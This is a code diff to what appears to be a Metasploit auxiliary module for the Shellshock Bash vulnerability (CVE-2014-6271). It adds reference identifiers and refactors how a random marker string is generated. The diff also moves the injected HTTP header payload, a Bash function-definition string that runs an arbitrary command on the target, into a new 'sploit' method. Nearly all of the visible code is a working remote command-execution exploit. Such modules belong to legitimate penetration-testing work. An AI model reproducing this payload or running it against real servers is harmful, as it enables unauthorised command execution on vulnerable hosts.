@@ -29,6 +29,8 @@ class Metasploit4 < Msf::Auxiliary
       ],
       'References' => [
         ['CVE', '2014-6271'],
+        ['OSVDB', '112004'],
+        ['EDB', '34765'],
         ['URL', 'https://access.redhat.com/articles/1200223'],
         ['URL', 'http://seclists.org/oss-sec/2014/q3/649']
       ],
@@ -43,14 +45,12 @@ class Metasploit4 < Msf::Auxiliary
       OptString.new('CMD', [true, 'Command to run (absolute paths required)',
         '/usr/bin/id'])
     ], self.class)
-
-    @marker = marker
   end
 
   def check_host(ip)
-    res = req("echo #{@marker}")
+    res = req("echo #{marker}")
 
-    if res && res.body.include?(@marker * 3)
+    if res && res.body.include?(marker * 3)
       report_vuln(
         :host => ip,
         :port => rport,
@@ -83,7 +83,7 @@ class Metasploit4 < Msf::Auxiliary
 
     res = req(datastore['CMD'])
 
-    if res && res.body =~ /#{@marker}(.+)#{@marker}/m
+    if res && res.body =~ /#{marker}(.+)#{marker}/m
       print_good("#{peer} - #{$1}")
       report_vuln(
         :host => ip,
@@ -99,13 +99,17 @@ class Metasploit4 < Msf::Auxiliary
       'method' => datastore['METHOD'],
       'uri' => normalize_uri(target_uri.path),
       'headers' => {
-        datastore['HEADER'] => "() { :;};echo #{@marker}$(#{cmd})#{@marker}"
+        datastore['HEADER'] => sploit(cmd)
       }
     )
   end
 
+  def sploit(cmd)
+    %Q{() { :;};echo -e "\\r\\n#{marker}$(#{cmd})#{marker}"}
+  end
+
   def marker
-    Rex::Text.rand_text_alphanumeric(rand(42) + 1)
+    @marker ||= Rex::Text.rand_text_alphanumeric(rand(42) + 1)
   end
 
 end
